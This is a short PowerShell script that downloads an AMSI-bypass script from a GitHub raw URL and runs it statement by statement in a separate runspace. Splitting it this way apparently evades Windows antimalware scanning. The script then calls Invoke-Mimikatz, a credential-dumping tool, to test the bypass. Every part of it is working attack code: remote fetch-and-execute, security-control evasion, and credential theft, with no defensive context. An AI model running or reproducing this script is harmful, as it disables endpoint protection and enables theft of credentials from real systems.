
#grab the AMSI bypass code from github
$block = (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/74l4r14/AMSI-Bypasses/refs/heads/main/patch1.ps1")

# Parse into AST and get top-level statements
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
$errors = $null
$tokens = $null
$ast = [System.Management.Automation.Language.Parser]::ParseInput($block, [ref]$tokens, [ref]$errors)

# Extract the top-level statement AST nodes and get the text of each statement
$statements = $ast.FindAll(
    { param($node) $node -is [System.Management.Automation.Language.StatementAst] -and $node.Parent -eq $ast.EndBlock },
    $true
) | ForEach-Object { $_.Extent.Text }

# Create a persistent PowerShell runspace
$ps = [System.Management.Automation.PowerShell]::Create()

foreach ($stmt in $statements) {
    $s = $stmt.Trim()
    if (-not $s) { continue }
    if ($s -match '^\s*#') { continue }

    $ps.AddScript($s) | Out-Null
    Write-Host "Executing statement:`n$s`n" -ForegroundColor Yellow
    $results = $ps.Invoke()
    $ps.Commands.Clear()

    if ($results) { $results }
}

#test the AMSI bypass
Invoke-Mimikatz

$ps.Dispose()
